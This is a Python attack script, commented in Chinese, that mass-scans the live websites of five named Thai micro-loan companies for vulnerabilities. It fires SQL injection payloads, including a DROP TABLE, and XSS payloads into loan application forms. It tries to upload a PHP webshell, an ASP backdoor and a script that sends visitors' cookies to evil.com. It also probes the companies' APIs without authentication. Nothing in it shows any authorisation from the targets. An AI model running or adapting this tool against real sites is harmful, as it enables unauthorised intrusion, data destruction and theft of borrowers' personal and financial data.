#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
泰国小额贷款公司批量测试工具
Thai Micro Loan Company Batch Testing Tool

专门针对泰国小额贷款借贷公司的贷款申请表进行批量安全测试
包含SQL注入、XSS、CSRF、文件上传、业务逻辑漏洞等多种攻击向量
"""

import asyncio
import aiohttp
import json
import time
import random
import hashlib
import base64
import string
import requests
import threading
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import quote, urlencode
from typing import Dict, List, Any, Optional, Tuple

class ThaiMicroLoanBatchTester:
    """泰国小额贷款批量测试器"""

    def __init__(self):
        self.session = requests.Session()
        self.test_results = []
        self.vulnerabilities_found = []

        # 泰国小额贷款公司目标列表（非银行类型）
        self.micro_loan_targets = [
            {
                "name": "MoneyCat Thailand",
                "url": "https://www.moneycat.co.th",
                "type": "小额贷款",
                "priority": "high",
                "loan_form_paths": [
                    "/apply",
                    "/loan-application",
                    "/register",
                    "/quick-loan",
                    "/personal-loan"
                ],
                "api_endpoints": [
                    "/api/application",
                    "/api/loan/apply",
                    "/api/user/register",
                    "/api/loan/calculate"
                ]
            },
            {
                "name": "Mula-X",
                "url": "https://mula-x.com",
                "type": "私人贷款",
                "priority": "high",
                "loan_form_paths": [
                    "/loan-application",
                    "/apply-now",
                    "/quick-cash",
                    "/personal-loan",
                    "/emergency-loan"
                ],
                "api_endpoints": [
                    "/api/loan/apply",
                    "/api/application/submit",
                    "/api/user/create",
                    "/api/loan/eligibility"
                ]
            },
            {
                "name": "Rocket Cash",
                "url": "https://www.rocket-cash.com",
                "type": "微型贷款",
                "priority": "medium",
                "loan_form_paths": [
                    "/application",
                    "/get-loan",
                    "/fast-cash",
                    "/micro-loan",
                    "/instant-loan"
                ],
                "api_endpoints": [
                    "/api/loan/request",
                    "/api/application/new",
                    "/api/customer/apply",
                    "/api/loan/instant"
                ]
            },
            {
                "name": "KLoan Thailand",
                "url": "https://kloan.co.th",
                "type": "个人贷款",
                "priority": "medium",
                "loan_form_paths": [
                    "/apply",
                    "/loan-form",
                    "/personal-loan",
                    "/cash-loan",
                    "/online-loan"
                ],
                "api_endpoints": [
                    "/api/loan/apply",
                    "/api/application/create",
                    "/api/borrower/register",
                    "/api/loan/submit"
                ]
            },
            {
                "name": "NgoenMun Finance",
                "url": "https://ngoenmun.com",
                "type": "金融平台",
                "priority": "high",
                "loan_form_paths": [
                    "/loan-application",
                    "/apply-loan",
                    "/quick-loan",
                    "/personal-finance",
                    "/cash-advance"
                ],
                "api_endpoints": [
                    "/api/v1/loan/apply",
                    "/api/application",
                    "/api/user/application",
                    "/api/loan/request"
                ]
            }
        ]

        # 泰语个人信息测试数据
        self.thai_test_data = {
            "names": [
                "สมชาย ใจดี", "สมศรี รักษา", "วิชัย มีชัย",
                "มานี สุขใจ", "ประสิทธิ์ มีเกียรติ", "นาตาลี รักเรียน",
                "Anon Jaideen", "Somchai Lovecharn", "Manee Sukjai"
            ],
            "id_cards": [
                "1234567890123", "9876543210987", "1111111111111",
                "2222222222222", "3333333333333", "4444444444444"
            ],
            "phones": [
                "0812345678", "0823456789", "0834567890",
                "0845678901", "0856789012", "0867890123"
            ],
            "emails": [
                "somchai@email.com", "manee@gmail.com", "anon@yahoo.com",
                "wchai@hotmail.com", "natee@outlook.com"
            ],
            "addresses": [
                "123 ถนนสุขุมวิท กรุงเทพ",
                "456 ถนนพระราม 4 กรุงเทพ",
                "789 ถนนสีลม กรุงเทพ"
            ]
        }

        # 贷款申请表字段配置
        self.loan_form_fields = [
            {"name": "first_name", "type": "text", "required": True},
            {"name": "last_name", "type": "text", "required": True},
            {"name": "thai_name", "type": "text", "required": False},
            {"name": "id_card", "type": "text", "required": True},
            {"name": "phone", "type": "text", "required": True},
            {"name": "email", "type": "email", "required": True},
            {"name": "address", "type": "text", "required": True},
            {"name": "province", "type": "select", "required": True},
            {"name": "district", "type": "text", "required": True},
            {"name": "loan_amount", "type": "number", "required": True},
            {"name": "loan_term", "type": "select", "required": True},
            {"name": "monthly_income", "type": "number", "required": True},
            {"name": "employer", "type": "text", "required": True},
            {"name": "job_title", "type": "text", "required": True},
            {"name": "work_phone", "type": "text", "required": False},
            {"name": "bank_account", "type": "text", "required": True},
            {"name": "bank_name", "type": "select", "required": True}
        ]

        # SQL注入载荷（针对贷款申请表）
        self.sql_injection_payloads = [
            "' OR 1=1--",
            "' UNION SELECT database(), user(), version()--",
            "'; DROP TABLE loan_applications;--",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' OR 1=1 AND SUBSTRING(password,1,1)='a'--",
            "สินเชื่อ' OR 1=1--",
            "เงินกู้' UNION SELECT * FROM users--",
            "คำร้อง' OR '1'='1'--",
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--"
        ]

        # XSS载荷（针对贷款申请表）
        self.xss_payloads = [
            "<script>alert('Loan Form XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS Attack');//",
            "<svg onload=alert('Loan System')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<script>alert('สินเชื่อถูกโจมตี')</script>",
            "<img src=x onerror=alert('ข้อมูลรั่วไหล')>",
            "';alert('เงินกู้');//",
            "<svg onload=alert('ระบบ Thai Loan')>",
            "<body onload=alert('Micro Loan XSS')>"
        ]

    def test_loan_form_sqli(self, target: Dict, form_url: str) -> List[Dict]:
        """测试贷款申请表的SQL注入漏洞"""
        vulnerabilities = []

        print(f"  [SQLi] 测试: {form_url}")

        for field in self.loan_form_fields:
            for payload in self.sql_injection_payloads:
                try:
                    test_data = {}
                    for f in self.loan_form_fields:
                        if f["name"] == field["name"]:
                            test_data[f["name"]] = payload
                        else:
                            test_data[f["name"]] = self._get_test_value(f)

                    # 发送POST请求
                    response = self.session.post(
                        form_url,
                        data=test_data,
                        timeout=10,
                        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                    )

                    # 检查SQL错误响应
                    sql_errors = [
                        "mysql_fetch_array", "mysql_num_rows", "Warning: mysql",
                        "SQL syntax.*MySQL", "MySQL server error",
                        "Microsoft ODBC SQL Server", "Microsoft SQL Server",
                        "ORA-", "Oracle error", "PL/SQL", "TNS:",
                        "PostgreSQL query failed", "pg_query", "PostgreSQL"
                    ]

                    response_text = response.text.lower()
                    for error in sql_errors:
                        if error.lower() in response_text:
                            vulnerabilities.append({
                                "type": "SQL Injection",
                                "target": target["name"],
                                "url": form_url,
                                "field": field["name"],
                                "payload": payload,
                                "error": error,
                                "status_code": response.status_code,
                                "evidence": error + " found in response"
                            })
                            print(f"    ✅ 发现SQL注入: {field['name']} -> {payload[:50]}...")
                            break

                except Exception as e:
                    continue

        return vulnerabilities

    def test_loan_form_xss(self, target: Dict, form_url: str) -> List[Dict]:
        """测试贷款申请表的XSS漏洞"""
        vulnerabilities = []

        print(f"  [XSS] 测试: {form_url}")

        for field in self.loan_form_fields:
            if field["type"] in ["text", "email", "textarea"]:
                for payload in self.xss_payloads:
                    try:
                        test_data = {}
                        for f in self.loan_form_fields:
                            if f["name"] == field["name"]:
                                test_data[f["name"]] = payload
                            else:
                                test_data[f["name"]] = self._get_test_value(f)

                        response = self.session.post(
                            form_url,
                            data=test_data,
                            timeout=10,
                            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                        )

                        # 检查XSS反射
                        if payload.replace('<', '&lt;').replace('>', '&gt;') not in response.text:
                            if payload in response.text or 'alert(' in response.text:
                                vulnerabilities.append({
                                    "type": "Cross-Site Scripting (XSS)",
                                    "target": target["name"],
                                    "url": form_url,
                                    "field": field["name"],
                                    "payload": payload,
                                    "status_code": response.status_code,
                                    "evidence": "XSS payload reflected in response"
                                })
                                print(f"    ✅ 发现XSS: {field['name']} -> {payload[:50]}...")

                    except Exception as e:
                        continue

        return vulnerabilities

    def test_file_upload_vulnerabilities(self, target: Dict, form_url: str) -> List[Dict]:
        """测试文件上传漏洞"""
        vulnerabilities = []

        print(f"  [UPLOAD] 测试文件上传: {form_url}")

        # 恶意文件内容
        malicious_files = {
            "webshell.php": "<?php system($_GET['cmd']); ?>",
            "backdoor.asp": "<% response.write(request(\"cmd\")) %>",
            "shell.js": "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
            "exploit.html": "<script>alert('File Upload XSS')</script>",
            "malicious.exe": "MZ\x90\x00\x03\x00\x00\x00"
        }

        for filename, content in malicious_files.items():
            try:
                files = {'file': (filename, content)}
                data = {
                    'action': 'upload',
                    'submit': 'Upload Document'
                }

                response = self.session.post(
                    form_url,
                    files=files,
                    data=data,
                    timeout=10,
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                )

                # 检查上传是否成功
                if response.status_code == 200 and ('upload' in response.text.lower() or 'success' in response.text.lower()):
                    if 'error' not in response.text.lower() and 'invalid' not in response.text.lower():
                        vulnerabilities.append({
                            "type": "File Upload Vulnerability",
                            "target": target["name"],
                            "url": form_url,
                            "file": filename,
                            "status_code": response.status_code,
                            "evidence": f"File {filename} uploaded successfully"
                        })
                        print(f"    ✅ 发现文件上传漏洞: {filename}")

            except Exception as e:
                continue

        return vulnerabilities

    def test_business_logic_flaws(self, target: Dict, form_url: str) -> List[Dict]:
        """测试业务逻辑漏洞"""
        vulnerabilities = []

        print(f"  [BUSINESS] 测试业务逻辑: {form_url}")

        # 测试异常贷款金额
        abnormal_amounts = ["-10000", "999999999", "0", "0.01", "100000000"]

        for amount in abnormal_amounts:
            try:
                test_data = self._generate_valid_loan_data()
                test_data["loan_amount"] = amount

                response = self.session.post(
                    form_url,
                    data=test_data,
                    timeout=10,
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                )

                # 检查是否接受异常金额
                if response.status_code == 200 and ('approved' in response.text.lower() or 'success' in response.text.lower()):
                    vulnerabilities.append({
                        "type": "Business Logic Flaw",
                        "target": target["name"],
                        "url": form_url,
                        "flaw_type": "Invalid Loan Amount",
                        "value": amount,
                        "status_code": response.status_code,
                        "evidence": f"System accepted invalid loan amount: {amount}"
                    })
                    print(f"    ✅ 发现业务逻辑漏洞: 异常贷款金额 {amount} 被接受")

            except Exception as e:
                continue

        # 测试绕过验证
        bypass_attempts = [
            {"monthly_income": "-1000", "description": "Negative Income"},
            {"id_card": "123", "description": "Invalid ID Format"},
            {"phone": "081", "description": "Invalid Phone Format"},
            {"email": "invalid-email", "description": "Invalid Email Format"}
        ]

        for bypass in bypass_attempts:
            try:
                test_data = self._generate_valid_loan_data()
                test_data.update({k: v for k, v in bypass.items() if k != "description"})

                response = self.session.post(
                    form_url,
                    data=test_data,
                    timeout=10,
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                )

                if response.status_code == 200 and ('success' in response.text.lower() or 'submitted' in response.text.lower()):
                    vulnerabilities.append({
                        "type": "Business Logic Flaw",
                        "target": target["name"],
                        "url": form_url,
                        "flaw_type": bypass["description"],
                        "status_code": response.status_code,
                        "evidence": f"Validation bypassed: {bypass['description']}"
                    })
                    print(f"    ✅ 发现业务逻辑漏洞: {bypass['description']}")

            except Exception as e:
                continue

        return vulnerabilities

    def test_api_endpoints(self, target: Dict) -> List[Dict]:
        """测试API端点漏洞"""
        vulnerabilities = []

        print(f"  [API] 测试API端点: {target['name']}")

        for endpoint in target["api_endpoints"]:
            api_url = target["url"] + endpoint
            print(f"    测试API: {api_url}")

            # 测试未授权访问
            try:
                response = self.session.get(api_url, timeout=10)
                if response.status_code == 200:
                    vulnerabilities.append({
                        "type": "Unauthorized API Access",
                        "target": target["name"],
                        "url": api_url,
                        "method": "GET",
                        "status_code": response.status_code,
                        "evidence": "API accessible without authentication"
                    })
                    print(f"      ✅ 发现未授权API访问: {endpoint}")
            except:
                pass

            # 测试API SQL注入
            for payload in self.sql_injection_payloads[:5]:  # 测试前5个载荷
                try:
                    test_data = {"id": payload, "user_id": payload}
                    response = self.session.post(api_url, json=test_data, timeout=10)

                    sql_errors = ["mysql", "sql", "ora-", "postgresql"]
                    response_text = response.text.lower()
                    for error in sql_errors:
                        if error in response_text:
                            vulnerabilities.append({
                                "type": "API SQL Injection",
                                "target": target["name"],
                                "url": api_url,
                                "payload": payload,
                                "status_code": response.status_code,
                                "evidence": f"SQL error in API response: {error}"
                            })
                            print(f"      ✅ 发现API SQL注入: {endpoint}")
                            break
                except:
                    continue

        return vulnerabilities

    def _get_test_value(self, field: Dict) -> str:
        """获取测试字段的值"""
        if field["name"] == "first_name":
            return random.choice(self.thai_test_data["names"]).split()[0]
        elif field["name"] == "last_name":
            return random.choice(self.thai_test_data["names"]).split()[-1]
        elif field["name"] == "thai_name":
            return random.choice(self.thai_test_data["names"])
        elif field["name"] == "id_card":
            return random.choice(self.thai_test_data["id_cards"])
        elif field["name"] == "phone":
            return random.choice(self.thai_test_data["phones"])
        elif field["name"] == "email":
            return random.choice(self.thai_test_data["emails"])
        elif field["name"] == "address":
            return random.choice(self.thai_test_data["addresses"])
        elif field["name"] == "loan_amount":
            return str(random.randint(10000, 50000))
        elif field["name"] == "monthly_income":
            return str(random.randint(15000, 50000))
        elif field["name"] == "bank_account":
            return "1234567890"
        else:
            return "test_value"

    def _generate_valid_loan_data(self) -> Dict:
        """生成有效的贷款申请数据"""
        data = {}
        for field in self.loan_form_fields:
            data[field["name"]] = self._get_test_value(field)
        return data

    def discover_loan_forms(self, target: Dict) -> List[str]:
        """发现贷款申请表页面"""
        discovered_forms = []

        print(f"  [DISCOVER] 发现贷款申请表: {target['name']}")

        for path in target["loan_form_paths"]:
            url = target["url"] + path
            try:
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    # 检查页面是否包含贷款申请表
                    content = response.text.lower()
                    form_indicators = [
                        "loan application", "apply for loan", "loan form",
                        "สมัครสินเชื่อ", "แบบฟอร์มสินเชื่อ", "กู้เงิน",
                        "name", "id card", "phone", "email", "loan amount"
                    ]

                    form_count = sum(1 for indicator in form_indicators if indicator in content)
                    if form_count >= 4:  # 至少包含4个表单指示器
                        discovered_forms.append(url)
                        print(f"    ✅ 发现贷款申请表: {url}")

            except Exception as e:
                continue

        return discovered_forms

    def run_comprehensive_test(self, target: Dict) -> Dict:
        """对单个目标进行综合测试"""
        print(f"\n🎯 开始测试目标: {target['name']} ({target['url']})")

        target_results = {
            "target": target["name"],
            "url": target["url"],
            "type": target["type"],
            "start_time": datetime.now().isoformat(),
            "vulnerabilities": [],
            "forms_discovered": [],
            "summary": {}
        }

        # 1. 发现贷款申请表
        discovered_forms = self.discover_loan_forms(target)
        target_results["forms_discovered"] = discovered_forms

        if not discovered_forms:
            print(f"  ❌ 未发现贷款申请表")
            return target_results

        # 2. 测试每个发现的表单
        for form_url in discovered_forms:
            print(f"\n  🔍 测试表单: {form_url}")

            # SQL注入测试
            sqli_vulns = self.test_loan_form_sqli(target, form_url)
            target_results["vulnerabilities"].extend(sqli_vulns)

            # XSS测试
            xss_vulns = self.test_loan_form_xss(target, form_url)
            target_results["vulnerabilities"].extend(xss_vulns)

            # 文件上传测试
            upload_vulns = self.test_file_upload_vulnerabilities(target, form_url)
            target_results["vulnerabilities"].extend(upload_vulns)

            # 业务逻辑测试
            business_vulns = self.test_business_logic_flaws(target, form_url)
            target_results["vulnerabilities"].extend(business_vulns)

        # 3. 测试API端点
        api_vulns = self.test_api_endpoints(target)
        target_results["vulnerabilities"].extend(api_vulns)

        # 4. 生成摘要
        vuln_types = {}
        for vuln in target_results["vulnerabilities"]:
            vuln_type = vuln["type"]
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1

        target_results["summary"] = {
            "total_vulnerabilities": len(target_results["vulnerabilities"]),
            "forms_discovered": len(discovered_forms),
            "vulnerability_types": vuln_types,
            "risk_level": "HIGH" if len(target_results["vulnerabilities"]) > 5 else "MEDIUM" if len(target_results["vulnerabilities"]) > 0 else "LOW"
        }

        target_results["end_time"] = datetime.now().isoformat()

        print(f"\n  📊 测试完成: {target['name']}")
        print(f"     发现表单: {len(discovered_forms)} 个")
        print(f"     发现漏洞: {len(target_results['vulnerabilities'])} 个")
        print(f"     风险等级: {target_results['summary']['risk_level']}")

        return target_results

    def run_batch_tests(self, max_workers: int = 3) -> Dict:
        """批量测试所有目标"""
        print("🚀 启动泰国小额贷款公司批量安全测试")
        print("=" * 60)

        start_time = datetime.now()

        # 使用线程池并发测试
        all_results = {
            "scan_info": {
                "start_time": start_time.isoformat(),
                "targets_count": len(self.micro_loan_targets),
                "max_workers": max_workers
            },
            "targets": [],
            "summary": {}
        }

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # 提交所有测试任务
            future_to_target = {
                executor.submit(self.run_comprehensive_test, target): target
                for target in self.micro_loan_targets
            }

            # 收集结果
            for future in as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    result = future.result()
                    all_results["targets"].append(result)
                    self.vulnerabilities_found.extend(result["vulnerabilities"])
                except Exception as e:
                    print(f"❌ 测试失败: {target['name']} - {str(e)}")

        # 生成总体摘要
        end_time = datetime.now()
        total_vulns = len(self.vulnerabilities_found)

        vuln_summary = {}
        for vuln in self.vulnerabilities_found:
            vuln_type = vuln["type"]
            vuln_summary[vuln_type] = vuln_summary.get(vuln_type, 0) + 1

        target_summary = {}
        for target_result in all_results["targets"]:
            risk_level = target_result["summary"]["risk_level"]
            target_summary[risk_level] = target_summary.get(risk_level, 0) + 1

        all_results["summary"] = {
            "end_time": end_time.isoformat(),
            "duration_seconds": (end_time - start_time).total_seconds(),
            "total_vulnerabilities": total_vulns,
            "vulnerability_types": vuln_summary,
            "risk_distribution": target_summary,
            "most_vulnerable_target": max(all_results["targets"], key=lambda x: len(x["vulnerabilities"]))["target"] if all_results["targets"] else None,
            "high_risk_targets": [t["target"] for t in all_results["targets"] if t["summary"]["risk_level"] == "HIGH"]
        }

        return all_results

    def generate_report(self, results: Dict) -> str:
        """生成测试报告"""
        report_file = f"thai_micro_loan_security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, ensure_ascii=False, indent=2)

        # 生成Markdown摘要报告
        md_file = f"thai_micro_loan_security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"

        with open(md_file, 'w', encoding='utf-8') as f:
            f.write("# 泰国小额贷款公司安全测试报告\n\n")
            f.write(f"**测试时间**: {results['scan_info']['start_time']}\n")
            f.write(f"**测试目标**: {results['scan_info']['targets_count']} 个\n")
            f.write(f"**测试时长**: {results['summary']['duration_seconds']:.2f} 秒\n\n")

            f.write("## 测试摘要\n\n")
            f.write(f"- **总漏洞数**: {results['summary']['total_vulnerabilities']} 个\n")
            f.write(f"- **高风险目标**: {len(results['summary']['high_risk_targets'])} 个\n")
            f.write(f"- **最脆弱目标**: {results['summary']['most_vulnerable_target']}\n\n")

            f.write("## 漏洞类型分布\n\n")
            for vuln_type, count in results['summary']['vulnerability_types'].items():
                f.write(f"- **{vuln_type}**: {count} 个\n")
            f.write("\n")

            f.write("## 目标详情\n\n")
            for target in results["targets"]:
                f.write(f"### {target['target']} ({target['url']})\n")
                f.write(f"- **类型**: {target['type']}\n")
                f.write(f"- **发现表单**: {target['summary']['forms_discovered']} 个\n")
                f.write(f"- **发现漏洞**: {target['summary']['total_vulnerabilities']} 个\n")
                f.write(f"- **风险等级**: {target['summary']['risk_level']}\n\n")

                if target['vulnerabilities']:
                    f.write("#### 发现的漏洞:\n")
                    for vuln in target['vulnerabilities'][:5]:  # 只显示前5个
                        f.write(f"- **{vuln['type']}**: {vuln.get('field', 'N/A')} - {vuln.get('evidence', 'N/A')}\n")
                    f.write("\n")

        return report_file, md_file

# 主程序入口
def main():
    """主程序"""
    tester = ThaiMicroLoanBatchTester()

    print("泰国小额贷款公司批量安全测试工具")
    print("专门针对非银行类小额贷款借贷公司的贷款申请表")
    print("=" * 60)

    # 运行批量测试
    results = tester.run_batch_tests(max_workers=3)

    # 生成报告
    json_report, md_report = tester.generate_report(results)

    print(f"\n🎉 批量测试完成!")
    print(f"📊 测试结果:")
    print(f"   - 总目标数: {results['scan_info']['targets_count']} 个")
    print(f"   - 发现漏洞: {results['summary']['total_vulnerabilities']} 个")
    print(f"   - 高风险目标: {len(results['summary']['high_risk_targets'])} 个")
    print(f"   - 测试时长: {results['summary']['duration_seconds']:.2f} 秒")
    print(f"\n📁 报告文件:")
    print(f"   - JSON报告: {json_report}")
    print(f"   - Markdown报告: {md_report}")

    if results['summary']['high_risk_targets']:
        print(f"\n⚠️  高风险目标需要立即关注:")
        for target in results['summary']['high_risk_targets']:
            print(f"   - {target}")

if __name__ == "__main__":
    main()